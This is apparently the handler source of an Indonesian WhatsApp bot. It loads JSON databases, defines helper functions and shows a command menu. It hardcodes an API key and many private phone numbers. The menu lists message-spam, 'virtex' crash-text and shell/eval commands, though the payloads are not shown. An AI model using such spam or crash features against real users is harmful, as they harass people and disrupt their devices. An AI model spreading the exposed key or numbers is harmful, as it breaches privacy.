const { 
WAConnection, 
MessageType,
Presence,
Mimetype,
GroupSettingChange,
ChatModification,
MessageOptions,
WALocationMessage,
WA_MESSAGE_STUB_TYPES,
ReconnectMode,
ProxyAgent,
waChatKey,
mentionedJid,
WA_DEFAULT_EPHEMERAL
} = require("@adiwajshing/baileys");
const fs = require("fs");
const moment = require("moment-timezone");
const { exec, spawn } = require("child_process");
const ffmpeg = require("fluent-ffmpeg");
const fetch = require("node-fetch");
const ms = require("parse-ms");
const toMs = require("ms");
const axios = require("axios");
const speed = require("performance-now");
const yts = require("yt-search");
const brainly = require("brainly-scraper");
const hx = require("hxz-api");
const ig = require("insta-fetcher");
const { EmojiAPI } = require("emoji-api");
const emoji = new EmojiAPI();
const translate = require("@vitalets/google-translate-api");
const { da } = require("@vitalets/google-translate-api/languages");
const imageToBase64 = require("image-to-base64");
const Exif = require('../lib/exif')
const simple = require('../lib/simple.js')
const exif = new Exif()
const { color, bgcolor } = require("../lib/color");
const { getBuffer, getRandom, getGroupAdmins, getGroup, runtime, sleep } = require("../lib/myfunc");
const { isLimit, limitAdd, getLimit, giveLimit, addBalance, kurangBalance, getBalance, isGame, gameAdd, givegame, cekGLimit } = require("../lib/limit");
const _prem = require("../lib/premium");
const afk = require("../lib/afk");
const { addBanned, unBanned, BannedExpired, cekBannedUser } = require("../lib/banned");
const { yta, ytv, formatDate } = require("../lib/ytdl");
const tts = require('node-gtts');
const nhentai = require('nhentai-js');
const crypto = require('crypto');
const mathjs = require('mathjs');
const request = require('request');
const { uptotele, uploadFile, RESTfulAPI, uploadImages } = require('../lib/uploadimage')
const listbahasa = require("@vitalets/google-translate-api/languages");
const { getUser, getPost, searchUser } = require('../lib/instagram');
const { fbdl } = require("../lib/fbdl");
const { fakestatus, fakeToko } = require("./fakeReply");
const game = require("../lib/game");
const { fetchJson } = require("../lib/fetcher");
const { y2mateA, y2mateV } = require("../lib/y2mate");
const { webp2gifFile, igDownloader, TiktokDownloader } = require("../lib/gif.js")
const { addLelah, delLelah, isCapek, addCountCapek, isCountCapek, delCountCapek } = require("../lib/capek");
const { addBadword, delBadword, isKasar, addCountKasar, isCountKasar, delCountKasar} = require("../lib/badword");
const { addCommands, checkCommands, deleteCommands } = require("../lib/commands");
const reminder = require("../lib/reminder");
const { mediafireDl } = require('../lib/mediafire.js')
const { jadibot, stopjadibot, listjadibot } = require('../lib/jadibot');
const { addVote, delVote } = require('../lib/vote')
const { tidur, isAfk, cekafk, addafk } = require("../lib/offline");
const _sewa = require("../lib/sewa");
const level = require("../lib/level");
const setGelud = require('../lib/gameGelud.js')
let voting = JSON.parse(fs.readFileSync('./database/voting.json'))

//Database
let tictactoe = JSON.parse(fs.readFileSync('./database/tictactoe.json'))
let _win = JSON.parse(fs.readFileSync('./database/tttwin.json'))
let _lose = JSON.parse(fs.readFileSync('./database/tttlose.json'))

const _reminder = JSON.parse(fs.readFileSync('./database/reminder.json'))
const _registered = JSON.parse(fs.readFileSync('./database/registered.json'))
let _scommand = JSON.parse(fs.readFileSync('./database/scommand.json'))
let _respon = JSON.parse(fs.readFileSync('./database/respon.json'))
let _stick = JSON.parse(fs.readFileSync('./database/sticker.json'))
let _vn = JSON.parse(fs.readFileSync('./database/vn.json'))
let _image = JSON.parse(fs.readFileSync('./database/image.json'))
let _video = JSON.parse(fs.readFileSync('./database/video.json'))
let pendaftar = JSON.parse(fs.readFileSync('./database/user.json'))
let setting = JSON.parse(fs.readFileSync('./config.json'));
let limit = JSON.parse(fs.readFileSync('./database/limit.json'));
let glimit = JSON.parse(fs.readFileSync('./database/glimit.json'));
let balance = JSON.parse(fs.readFileSync('./database/balance.json'));
let _claim = JSON.parse(fs.readFileSync('./database/claim.json'))
let premium = JSON.parse(fs.readFileSync('./database/premium.json'));
let sewa = JSON.parse(fs.readFileSync('./database/sewa.json'));
let ban = JSON.parse(fs.readFileSync('./database/ban.json'));
let antilinkgrup = JSON.parse(fs.readFileSync('./database/antilinkgrup.json'));
let lelah = JSON.parse(fs.readFileSync('./database/capek.json'));
let grupcapek = JSON.parse(fs.readFileSync('./database/grupcapek.json'));
let sencapek = JSON.parse(fs.readFileSync('./database/sencapek.json'));
let mute = JSON.parse(fs.readFileSync('./database/mute.json'));
let autosticker = JSON.parse(fs.readFileSync('./database/autosticker.json'));
let antitagsurya = JSON.parse(fs.readFileSync('./database/antitagsurya.json'));
let antilinkyoutube = JSON.parse(fs.readFileSync('./database/antilinkyoutube.json'));
let antilinktiktok = JSON.parse(fs.readFileSync('./database/antilinktiktok.json'));
let antilinkfacebook = JSON.parse(fs.readFileSync('./database/antilinkfacebook.json'));
let antilinkinstagram = JSON.parse(fs.readFileSync('./database/antilinkinstagram.json'));
let antivirtex = JSON.parse(fs.readFileSync('./database/antivirtex.json'));
let antitag = JSON.parse(fs.readFileSync('./database/antitag.json'));
let simih = JSON.parse(fs.readFileSync('./database/simih.json'));
let autovideo = JSON.parse(fs.readFileSync('./database/autovideo.json'));
let antilinktelegram = JSON.parse(fs.readFileSync('./database/antilinktelegram.json'));
let antiwame = JSON.parse(fs.readFileSync('./database/antiwame.json'));
let badword = JSON.parse(fs.readFileSync('./database/badword.json'));
let grupbadword = JSON.parse(fs.readFileSync('./database/grupbadword.json'));
let _senbadword = JSON.parse(fs.readFileSync('./database/senbadword.json'));
let autoimage = JSON.parse(fs.readFileSync('./database/autoimage.json'));
let autocolong = JSON.parse(fs.readFileSync('./database/autocolong.json'));
let antilink = JSON.parse(fs.readFileSync('./database/antilink.json'));
let antiviewonce = JSON.parse(fs.readFileSync('./database/antiviewonce.json'));
let antibule = JSON.parse(fs.readFileSync('./database/antibule.json'));
let psholat = JSON.parse(fs.readFileSync('./database/sholat.json'));
let autojoin = JSON.parse(fs.readFileSync('./database/autojoin.json'));
let _leveling = JSON.parse(fs.readFileSync('./database/leveling.json'))
let _level = JSON.parse(fs.readFileSync('./database/level.json'))
let mining = JSON.parse(fs.readFileSync('./database/mining.json'))
let _musuh = JSON.parse(fs.readFileSync('./database/musuh.json'))
let _totalharian = JSON.parse(fs.readFileSync('./database/totalharian.json'))
let _totalcmd = JSON.parse(fs.readFileSync('./database/totalcmd.json'))
let _heal = JSON.parse(fs.readFileSync('./database/adventure/heal.json'))
let _potion = JSON.parse(fs.readFileSync('./database/adventure/potion.json'))
let nsfw = JSON.parse(fs.readFileSync('./database/nsfw.json'))
let _update = JSON.parse(fs.readFileSync('./database/update.json'))
let antihapus = JSON.parse(fs.readFileSync('./database/antidelete.json'));
let off = JSON.parse(fs.readFileSync('./database/offline.json'));

const { cmdadd } = require('../lib/totalcmd.js')

// Game
let tebakgambar = [];
let family100 = [];
let caklontong = [];
let tebaklirik = [];
let tebaklagu = [];
let tebakjenaka = [];
let siapaaku = [];
let asahotak = [];
let tebakkata = [];
let tebakkimia = [];
let tebakbendera = [];
let tebakanime = [];
let tebakkalimat = [];
let tekateki = [];
let susunkata = [];
let mtk = [];

let ky_ttt = []
let tttawal= ["0️⃣","1️⃣","2️⃣","3️⃣","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣"]
let hadiah = '100'
const winawal = 2
const loseawal = 2
const losecount = 1
const wincount = 1

let tgwaktu = '100'
let mathwaktu = '100'
let balanc = '500'
let balancettt = '300'
let harganya = '500'
let potionawal = 20
let healawal = 50
let sadap = false

let hit_today = [];
let cmhit = [];

//SETTING
let lolkey = 'a93c7a5f5dc8ba3eeb1ebf44'
let S = '\`\`\`'
let bgbot = 'https://i.ibb.co/8DdJQpN/60b4e7bdb849.jpg'
let suryaImg = fs.readFileSync(setting.suryaImg)
let fake = `© ɪ ᴀᴍ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ`
let ownerS = '62895415497664'
let Suryaaa = '6285743780860'
let Bestie = '6285743780860@s.whatsapp.net'
let BestieName = 'Mecha Botz'
let Mechagc = `https://chat.whatsapp.com/IKFMxJJgC282pZnsTWUZv3`
let Mecha = `6285743780860@s.whatsapp.net`
let MechaName = `Mecha Botz`
let namabot = '𝑴𝒆𝒄𝒉𝒂 𝑩𝒐𝒕𝒛 𝑶𝒇𝒇𝒊𝒄𝒊𝒂𝒍'

const Dinda = `6281999505999@s.whatsapp.net`
const Vinna = `6282314460324@s.whatsapp.net`
const Shayna = `6285724775116@s.whatsapp.net`
const Amanda = `6281227993047@s.whatsapp.net`

const Aisyah = `6289637283487@s.whatsapp.net`
const Kizora = `6282198938463@s.whatsapp.net`
const Farid = `6281231951590@s.whatsapp.net`

let Selvi = `6288215702843@s.whatsapp.net`
let Suryaa = `62895415497664@s.whatsapp.net`
let Surya = `62895415497664@s.whatsapp.net`
const Mine = '6287771854031@s.whatsapp.net'

const Tristan = `6281935507817@s.whatsapp.net`
const Reva = `6288809616937@s.whatsapp.net`
const Syahira = `6282366415501@s.whatsapp.net`
const Rifki = `6283168912977@s.whatsapp.net`

let indonesia = { 
wait: '*Tunggu permintaan anda sedang diproses*',
success: 'Sukses',
error: { lv: 'Link yang kamu berikan tidak valid', api: 'Maaf terjadi kesalahan!\n\nbeberapa fitur error karena bot ini berjalan dirailway bukan ditermux.' },
OnlyGrup: 'Perintah ini hanya bisa digunakan di grup',
OnlyPM: 'Perintah ini hanya bisa digunakan di private message',
GrupAdmin: 'Perintah ini hanya bisa digunakan oleh Admin Grup',
BotAdmin: 'Bot Harus menjadi admin',
OnlySurya: `Perintah ini hanya dapat digunakan oleh @${Suryaa.split('@')[0]}`,
OnlyPrem: `Maaf fitur ini hanya khusus user premium, Silahkan beli premium untuk menggunakan fitur ini`,
OnlyVerify: `*Maaf kamu belum terverifikasi, Silahkan pencet tombol dibawah untuk verifikasi!*`,
Limits: `Limit kamu sudah habis silahkan kirim *Limit* untuk mengecek limit`}

let inggris = { 
wait: `*Wait for your request to be processed*`,
success: `Success`,
error: { lv: `The link you provided is invalid`, api: 'Sorry an error occurred'},
OnlyGrup: `This command can only be used in groups`,
OnlyPM: `This command can only be used in private messages`,
GrupAdmin: `This command can only be used by Group Admin`,
BotAdmin: `Bot Must be admin`,
OnlySurya: `This command can only be used by @${Suryaa.split('@')[0]}`,
OnlyPrem: `Sorry this feature is only for premium users, please buy premium to use this feature`,
OnlyVerify: `*Sorry you haven't been verified, Please press the button below for verification!*`}

let malaysia = {
wait: '*Tunggu permintaan anda diproses*',
success: 'Kejayaan',
error: { lv: 'Pautan yang anda berikan tidak sah', api: 'Perintah ini hanya boleh digunakan dalam kumpulan' },
OnlyGrup: 'Perintah ini hanya boleh digunakan dalam kumpulan',
OnlyPM: 'Perintah ini hanya dapat digunakan dalam mesej peribadi',
GrupAdmin: 'Perintah ini hanya dapat digunakan oleh Pentadbir Kumpulan',
BotAdmin: 'Bot Mesti admin',
OnlySurya: `Perintah ini hanya dapat digunakan oleh @${Suryaa.split('@')[0]}`,
OnlyPrem: `Maaf ciri ini hanya untuk pengguna premium, Sila beli premium untuk menggunakan fitur ini`,
OnlyVerify: `*Maaf anda belum disahkan, tekan butang di bawah untuk pengesahan!*`}

let jepang = { 
wait: '*リクエストが処理されるのを待ちます*',
success: '成功',
error: { lv: '指定したリンクが無効です', api: 'エラーが発生しました' },
OnlyGrup: 'このコマンドはグループでのみ使用できます',
OnlyPM: 'このコマンドはプライベートメッセージでのみ使用できます',
GrupAdmin: 'このコマンドは、グループ管理者のみが使用できます',
BotAdmin: 'ボットは管理者である必要があります',
OnlySurya: `このコマンドは、次のユーザーのみが使用できます。 @${Suryaa.split('@')[0]}`,
OnlyPrem: `申し訳ありませんが この機能はプレミアムユーザー専用です。この機能を使用するにはプレミアムを購入してください`,
OnlyVerify: `*確認されていないため 下のボタンを押して確認してください。*`}

let mess = indonesia

let antihidetag = true
let prefa = '.'
let mode = 'PUBLIC'
let antidelete = 'AKTIF'
let autovn = false
let autoketik = false
let autoread = false
let memberLimit = 1
let antitroli = true

// Prefix
let multi = false
let nopref = true
let waktu = '-'
let alasanafk = '-'
let offline = false
let creator = '62895415497664'
let menusimpel = 'true'
let menubutton = 'false'
let menuproduk = 'false'
let gamemode = 'false'

let gcounti = { prem: 100, user: 5}
let limitCount = 5
let gamewaktu = 70

let {
ownerNumber,
xteam,
zeks,
free,
owner,
revatod,
kizora,
prem
} = setting
const d = new Date
let locale = 'id'
const dateIslamic = Intl.DateTimeFormat(locale + '-TN-u-ca-islamic', {
day: 'numeric',
month: 'long',
year: 'numeric'
}).format(d)
const gmt = new Date(0).getTime() - new Date('1 Januari 2021').getTime()
moment.tz.setDefault("Asia/Jakarta").locale("id");
var date = new Date();
var weton = ['Pahing','pon','wage','kliwon','legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
var tahun = date.getFullYear();
var bulan1 = date.getMonth();
var tanggal = date.getDate();
var hari = date.getDay();
var jam = date.getHours();
var menit = date.getMinutes();
var detik = date.getSeconds();
var waktoo = date.getHours();
switch(hari) {
case 0: hari = 'Minggu'; break;
case 1: hari = 'Senin'; break;
case 2: hari = 'Selasa'; break;
case 3: hari = 'Rabu'; break;
case 4: hari = 'Kamis'; break;
case 5: hari = 'Jum`at'; break;
case 6: hari = 'Sabtu'; break;
}
switch(bulan1) {
case 0: bulan1 = 'Januari'; break;
case 1: bulan1 = 'Februari'; break;
case 2: bulan1 = 'Maret'; break;
case 3: bulan1 = 'April'; break;
case 4: bulan1 = 'Mei'; break;
case 5: bulan1 = 'Juni'; break;
case 6: bulan1 = 'Juli'; break;
case 7: bulan1 = 'Agustus'; break;
case 8: bulan1 = 'September'; break;
case 9: bulan1 = 'Oktober'; break;
case 10: bulan1 = 'November'; break;
case 11: bulan1 = 'Desember'; break;
}
var tampilBulan = '' + hari + ' ' + weton + ' - ' + tanggal + ' ' + bulan1 + ' ' + tahun;

/*var ase = new Date()
var waktunyabro = ase.getHours()
switch(waktunyabro){
case 0: waktunyabro = 'Selamat Malam🌚'; break;
case 1: waktunyabro = 'Selamat Malam🌚'; break;
case 2: waktunyabro = 'Selamat Malam🌚'; break;
case 3: waktunyabro = 'Selamat Pagi🌝'; break;
case 4: waktunyabro = 'Selamat Pagi🌝'; break;
case 5: waktunyabro = 'Selamat Pagi🌝'; break;
case 6: waktunyabro = 'Selamat Pagi🌝'; break;
case 7: waktunyabro = 'Selamat Pagi🌝'; break;
case 8: waktunyabro = 'Selamat Pagi🌝'; break;
case 9: waktunyabro = 'Selamat Pagi🌝'; break;
case 10: waktunyabro = 'Selamat Pagi🌝'; break;
case 11: waktunyabro = 'Selamat Siang🔥'; break;
case 12: waktunyabro = 'Selamat Siang🔥'; break;
case 13: waktunyabro = 'Selamat Siang🔥'; break;
case 14: waktunyabro = 'Selamat Siang🔥'; break;
case 15: waktunyabro = 'Selamat Sore🌹'; break;
case 16: waktunyabro = 'Selamat Sore🌹'; break;
case 17: waktunyabro = 'Selamat Sore🌹'; break;
case 18: waktunyabro = 'Selamat Malam🌚'; break;
case 19: waktunyabro = 'Selamat Malam🌚'; break;
case 20: waktunyabro = 'Selamat Malam🌚'; break;
case 21: waktunyabro = 'Selamat Malam🌚'; break;
case 22: waktunyabro = 'Selamat Malam🌚'; break;
case 23: waktunyabro = 'Selamat Malam🌚'; break;
}
var Ucapan = ${waktunyabro}*/

const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
        if(time2 < "23:59:00"){
        var Ucapan = 'Selamat Malam🌃'
}
        if(time2 < "19:00:00"){
        var Ucapan = 'Selamat Petang🌆'
}
        if(time2 < "18:00:00"){
        var Ucapan = 'Selamat Sore🌇'
}
        if(time2 < "15:00:00"){
        var Ucapan = 'Selamat Siang🏙️'
}
        if(time2 < "11:00:00"){
        var Ucapan = 'Selamat Pagi🌅'
}
        if(time2 < "05:00:00"){
        var Ucapan = 'Selamat Malam🌃'
}

var ase = new Date();
var waktoo = ase.getHours();
switch(waktoo){
case 0: waktoo = `Waktu Tengah Malam - Tidur Kak :)`; break;
case 1: waktoo = `Waktu Tengah Malam
- Tidur Kak, Ga baik bergadang :)`; break;
case 2: waktoo = `Waktu Dini Hari - Tidur Kak :)`; break;
case 3: waktoo = `Waktu Dini Hari - Bangun Kak Hampir Subuh`; break;
case 4: waktoo = `Waktu Subuh - Jangan Lupa Sholat Subuh Kak`; break;
case 5: waktoo = `Waktu Subuh - Jangan Lupa Sholat Subuh Kak`; break;
case 6: waktoo = `Waktu Pagi - Jangan Lupa Sarapan Kak`; break;
case 7: waktoo = `Waktu Pagi - Jangan Lupa Sarapan Kak`; break;
case 8: waktoo = `Waktu Pagi - Jangan Lupa Sarapan Kak`; break;
case 9: waktoo = `Waktu Pagi - Jangan Sampai Telat Makan Kak`; break;
case 10: waktoo = `Waktu Pagi - Jangan Lupa Istirahat Kak`; break;
case 11: waktoo = `Waktu Dhuhur -️ Jangan Lupa Sholat Dhuhur Kak`; break;
case 12: waktoo = `Waktu Dhuhur -️ Jangan Lupa Sholat Dzuhur`; break;
case 13: waktoo = `Waktu Siang - Jangan Lupa Makan Siang Kak`; break;
case 14: waktoo = `Waktu Siang - Jangan Lupa Makan Siang Kak`; break;
case 15: waktoo = `Waktu Ashar - Jangan Lupa Sholat Ashar Kak`; break;
case 16: waktoo = `Waktu Sore - Jangan Lupa Mandi Kak`; break;
case 17: waktoo = `Waktu Sore - Jangan Lupa Mandi Kak`; break;
case 18: waktoo = `Waktu Magrib - Jangan Lupa Sholat Magrib Kak`; break;
case 19: waktoo = `Waktu Isya - Jangan Lupa Sholat Isya Kak`; break;
case 20: waktoo = `Waktu Malam - Jangan Lupa Makan Malam Kak`; break;
case 21: waktoo = `Waktu Malam - Selamat Tidur Kak`; break;
case 22: waktoo = `Waktu Malam - Jangan Lupa Beristirahat`; break;
case 23: waktoo = `Waktu Tengah Malam - Tidur Kak Gak baik bergadang :)`; break;
}
var sholat = "" + waktoo; 

const addCmd = (id, command) => {
const obj = { id: id, chats: command }
_scommand.push(obj)
fs.writeFileSync('./database/scommand.json', JSON.stringify(_scommand))
}
const getCommandPosition = (id) => {
let position = null
Object.keys(_scommand).forEach((i) => {
if (_scommand[i].id === id) {
position = i
}
})
if (position !== null) {
return position
}
}
const getCmd = (id) => {
let position = null
Object.keys(_scommand).forEach((i) => {
if (_scommand[i].id === id) {
position = i
}
})
if (position !== null) {
return _scommand[position].chats
}
}
const checkSCommand = (id) => {
let status = false
Object.keys(_scommand).forEach((i) => {
if (_scommand[i].id === id) {
status = true
}
})
return status
}

const addResponBot = (txt, respon) => {
const obj = { txt: txt, resp: respon }
_respon.push(obj)
fs.writeFileSync('./database/respon.json', JSON.stringify(_respon))
}
const checkText = (txt) => {
let status = false
Object.keys(_respon).forEach((i) => {
if (_respon[i].txt === txt) {
status = true
}
})
return status
}

const getRespon = (txt) => {
let position = null
Object.keys(_respon).forEach((i) => {
if (_respon[i].txt === txt) {
position = i
}
})
if (position !== null) {
return _respon[position].resp
}
}

const getResponPosition = (txt) => {
let position = null
Object.keys(_respon).forEach((i) => {
if (_respon[i].txt === txt) {
position = i
}
})
if (position !== null) {
return position
}
}

const getAllRespon = () => {
const array = []
Object.keys(_respon).forEach((i) => {
array.push(_respon[i].txt)
})
return array
}

const getRegisteredRandomId = () => {
return _registered[Math.floor(Math.random() * _registered.length)].id
}

const addRegisteredUser = (userid, sender, serial, time) => {
const obj = { id: userid, name: sender, serial: serial, time: time }
//const addRegisteredUser = (userid, sender, umur, time) => {
//const obj = { id: userid, name: sender, age: umur, time: time }
_registered.push(obj)
fs.writeFileSync('./database/registered.json', JSON.stringify(_registered))
}


const createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}

const checkRegisteredUser = (sender) => {
let status = false
Object.keys(_registered).forEach((i) => {
if (_registered[i].id === sender) {
status = true
}
})
return status
}

const bayarHeal = (sender, amount) => {
let position = false
Object.keys(_heal).forEach((i) => {
if (_heal[i].id === sender) {
position = i
}
})
if (position !== false) {
_heal[position].heal -= amount
fs.writeFileSync('./database/adventure/heal.json', JSON.stringify(_heal))
}
}
const addHealUser = (sender, amount) => {
let position = false
Object.keys(_heal).forEach((i) => {
if (_heal[i].id === sender) {
position = i
}
})
if (position !== false) {
_heal[position].heal -= 25
fs.writeFileSync('./database/adventure/heal.json', JSON.stringify(_heal))
}
}
const healAdd = (sender) => {
let position = false
Object.keys(_heal).forEach((i) => {
if (_heal[i].id == sender) {
position = i
}
})
if (position !== false) {
_heal[position].heal += 25
fs.writeFileSync('./database/adventure/heal.json', JSON.stringify(_heal))
 }
 }

const addMusuh = (userId) => {
_musuh.push(userId)
fs.writeFileSync('./database/musuh.json', JSON.stringify(_musuh))
}
const delMusuh = (userId) => {
_musuh.splice(userId, 1)
fs.writeFileSync('./database/musuh.json', JSON.stringify(_musuh))
}

module.exports = async(surya, msg, blocked, baterai, _afk, welcome, left) => {
try {
const { vir3, virtex, virtex2, virtex3, virtex4, prank, tahlil, listsurah, animesaran, yasin } = require("./help");
const { type, quotedMsg, isGroup, isQuotedMsg, mentioned, sender, from, fromMe, pushname, chats, isBaileys} = msg
if (isBaileys) return
const { text, extendedText, contact, location, liveLocation, image, video, gif, sticker, document, audio, product } = MessageType
const args = chats.split(' ')
const command = chats.toLowerCase().split(' ')[0] || ''
if (multi){
var prefix = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(command) ? command.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : '.'
} else {
if (nopref){
prefix = ''
} else {
prefix = prefa
}
}

 /*function clockString(ms) {
 let h = isNaN(ms) ? "--" : Math.floor(ms / 3600000);
 let m = isNaN(ms) ? "--" : Math.floor(ms / 60000) % 60;
 let s = isNaN(ms) ? "--" : Math.floor(ms / 1000) % 60;
 return [h, m, s].map((v) => v.toString().padStart(2, 0)).join(":");
}

let settingstatus = 0;
if (new Date() * 1 - settingstatus > 1000) {
let _uptime = process.uptime() * 1000;
let uptime = clockString(_uptime);
//await surya.groupUpdateSubject('62895415497664-1632840566@g.us', `🌸𝐴𝑛𝑖𝑚𝑒メ𝐿𝑜𝑣𝑒𝑟𝑠🎌 ${uptime}`)
//await surya.updateProfileName(`Aktif selama ${uptime}`)
//await surya.setStatus(`Aktif selama ${uptime}`).catch((_) => _);
settingstatus = new Date() * 1;
}*/

const addOff = (from) => {
const obj = { id: from, expired: Date.now() + toMs('10m') }
off.push(obj)
fs.writeFileSync('./database/offline.json', JSON.stringify(off))
}
const cekOff = (_dir) => {
setInterval(() => {
let position = null
Object.keys(_dir).forEach((i) => {
if (Date.now() >= _dir[i].expired) {
position = i
}
})
if (position !== null) {
_dir.splice(position, 1)
fs.writeFileSync('./database/offline.json', JSON.stringify(_dir))
}
}, 3000)
}
const isOff = (idi) => {
let status = false
Object.keys(off).forEach((i) => {
if (off[i].id === idi) {
status = true
}
})
return status
}

cekOff(off)
if (!msg.key.remoteJid.endsWith("@g.us") && offline) {
if (!msg.key.fromMe) {
if (isOff(msg.key.remoteJid)) return
addafk(msg.key.remoteJid)
let heheh = ms(Date.now() - waktu)
}
}

let MENU = `
╭❏ _*INFO MENU*_
├⬡ Cekprefix
├⬡ ${prefix}stats
├⬡ ${prefix}limit
├⬡ ${prefix}runtime
├⬡ ${prefix}getstikercmd
├⬡ ${prefix}speed
├⬡ ${prefix}owner
├⬡ ${prefix}donasi
├⬡ ${prefix}sewabot
├⬡ ${prefix}listheroml
├⬡ ${prefix}kodebahasa
├⬡ ${prefix}infocreator
│
├❏ _*PREMIUM MENU*_
├⬡ ${prefix}tagall
├⬡ ${prefix}hidetag
├⬡ ${prefix}igdl url
├⬡ ${prefix}swm
├⬡ ${prefix}ytmp4 url
├⬡ ${prefix}ytmp3 url
├⬡ ${prefix}fbdl url
├⬡ ${prefix}tiktok url
├⬡ ${prefix}yts query
├⬡ ${prefix}play query
├⬡ ${prefix}playmp4 query
├⬡ ${prefix}lirik query
├⬡ ${prefix}cuara daerah
├⬡ ${prefix}asupan
├⬡ ${prefix}storyanime
├⬡ ${prefix}tebakgambar
├⬡ ${prefix}tebakanime
├⬡ ${prefix}jadwaltvnow
├⬡ ${prefix}infogempa
├⬡ ${prefix}heroml [nama hero ML]
├⬡ ${prefix}countdown [21/05/2022]
├⬡ ${prefix}herolist
├⬡ ${prefix}hentai
├⬡ ${prefix}hentai2
├⬡ ${prefix}blowjob
├⬡ ${prefix}wancak
├⬡ ${prefix}darkjoke
├⬡ ${prefix}simih [1/0]
├⬡ ${prefix}apikeycek
│
├❏ _*OWNER MENU*_
├⬡ ${prefix}antitagsurya [1/0]
├⬡ ${prefix}autosticker [1/0]
├⬡ ${prefix}autoimage [1/0]
├⬡ ${prefix}autovideo [1/0]
├⬡ ${prefix}autocolong [1/0]
├⬡ ${prefix}join
├⬡ ${prefix}ban @tag
├⬡ ${prefix}unban @tag
├⬡ ${prefix}self
├⬡ ${prefix}public
├⬡ ${prefix}setpp
├⬡ ${prefix}setname
├⬡ ${prefix}setbio
├⬡ ${prefix}setthumb [reply gambar]
├⬡ ${prefix}bc
├⬡ ${prefix}clearall
├⬡ ${prefix}clearbadword @tag
├⬡ ${prefix}clearwibu @tag
├⬡ ${prefix}addwibu
├⬡ ${prefix}delwibu
├⬡ ${prefix}addcmd
├⬡ ${prefix}delcmd
├⬡ ${prefix}addbadword
├⬡ ${prefix}delbadword
├⬡ ${prefix}exif nama|author
├⬡ ${prefix}spam teks|jumlah
├⬡ ${prefix}repeat teks
├⬡ ${prefix}prank
├⬡ ${prefix}virtex
├⬡ ${prefix}restart
├⬡ ${prefix}ehex teks
├⬡ ${prefix}dehex teks
├⬡ ${prefix}hex6 teks
├⬡ ${prefix}hex4 teks
├⬡ ${prefix}hex2 teks
├⬡ ${prefix}hex1 teks
├⬡ ${prefix}setprefix
├⬡ >
├⬡ $
│
├❏ _*GROUP MENU*_
├⬡ ${prefix}afk
├⬡ ${prefix}infogrup
├⬡ ${prefix}chatinfo
├⬡ ${prefix}linkgc
├⬡ ${prefix}getnamegrup
├⬡ ${prefix}getdeskgrup
├⬡ ${prefix}getppgrup
├⬡ ${prefix}listbadword
├⬡ ${prefix}listwibu
├⬡ ${prefix}listcmd
├⬡ ${prefix}add 628xx
├⬡ ${prefix}kick @tag
├⬡ ${prefix}promote @tag
├⬡ ${prefix}demote @tag
├⬡ ${prefix}leave
├⬡ ${prefix}setdesc
├⬡ ${prefix}setgrupname
├⬡ ${prefix}setppgrup
├⬡ ${prefix}opengrup
├⬡ ${prefix}closegrup
├⬡ ${prefix}mute
├⬡ ${prefix}unmute
├⬡ ${prefix}getpic @tag
├⬡ ${prefix}getbio @tag
├⬡ ${prefix}revoke
│
├❏ _*SECURITY MENU*_
├⬡ ${prefix}antilinkgrup [1/0]
├⬡ ${prefix}antilinkfacebook [1/0]
├⬡ ${prefix}antilinktiktok [1/0]
├⬡ ${prefix}antilinkyoutube [1/0]
├⬡ ${prefix}antilinkinstagram [1/0]
├⬡ ${prefix}welcome [1/0]
├⬡ ${prefix}left [1/0]
├⬡ ${prefix}antibadword [1/0]
├⬡ ${prefix}antivirtex [on/off]
│
├❏ _*GAME MENU*_
├⬡ ${prefix}tictactoe @tag
├⬡ ${prefix}tebakkata
├⬡ ${prefix}tebakjenaka
├⬡ ${prefix}tebakbendera
├⬡ ${prefix}tebaklirik
├⬡ ${prefix}tebakkimia
├⬡ ${prefix}siapakahaku
├⬡ ${prefix}family100
├⬡ ${prefix}caklontong
├⬡ ${prefix}asahotak
├⬡ ${prefix}suit
├⬡ ${prefix}dadu
├⬡ ${prefix}slot
├⬡ ${prefix}level
├⬡ ${prefix}buyglimit
├⬡ ${prefix}buylimit
├⬡ ${prefix}topglobal
├⬡ ${prefix}toplokal
│
├❏ _*MAKER MENU*_
├⬡ galaxystyle teks
├⬡ wetglass teks
├⬡ multicolor3d teks
├⬡ watercolor teks
├⬡ luxurygold teks
├⬡ lighttext teks
├⬡ beautifulflower teks
├⬡ puppycute teks
├⬡ royaltext teks
├⬡ heartshaped teks
├⬡ birthdaycake teks
├⬡ hologram3d teks
├⬡ glossychrome teks
├⬡ greenbush teks
├⬡ metallogo teks
├⬡ noeltext teks
├⬡ glittergold teks
├⬡ textcake teks
├⬡ starsnight teks
├⬡ wooden3d teks
├⬡ textbyname teks
├⬡ writegalacy teks
├⬡ galaxybat teks
├⬡ snow3d teks
├⬡ birthdayday teks
├⬡ goldplaybutton teks
├⬡ silverplaybutton teks
├⬡ freefire teks
├⬡ ${prefix}blackpink teks
├⬡ ${prefix}mlwall teks
├⬡ ${prefix}logogaming teks
├⬡ ${prefix}pubgmaskot teks
├⬡ ${prefix}anonymhacker teks
├⬡ ${prefix}bannerlol teks
├⬡ ${prefix}fpslogo teks
├⬡ ${prefix}hartacustom teks
├⬡ ${prefix}aovwall teks
├⬡ ${prefix}tahta teks
├⬡ ${prefix}neon teks
├⬡ ${prefix}thunder teks
├⬡ ${prefix}cloud teks
├⬡ ${prefix}holographic teks
├⬡ ${prefix}bokeh teks
├⬡ ${prefix}sandwriting teks
├⬡ ${prefix}sandsummer teks
├⬡ ${prefix}futureneon teks
├⬡ ${prefix}sandengraved teks
├⬡ ${prefix}metaldark teks
├⬡ ${prefix}neonlight teks
├⬡ ${prefix}text1917 teks
├⬡ ${prefix}minion teks
├⬡ ${prefix}deluxesilver teks
├⬡ ${prefix}newyearcard teks
├⬡ ${prefix}bloodfrosted teks
├⬡ ${prefix}halloween teks
├⬡ ${prefix}jokerlogo teks
├⬡ ${prefix}fireworksparkle teks
├⬡ ${prefix}natureleaves teks
├⬡ ${prefix}strawberry teks
├⬡ ${prefix}box3d teks
├⬡ ${prefix}roadwarning teks
├⬡ ${prefix}breakwall teks
├⬡ ${prefix}icecold teks
├⬡ ${prefix}luxury teks
├⬡ ${prefix}summersand teks
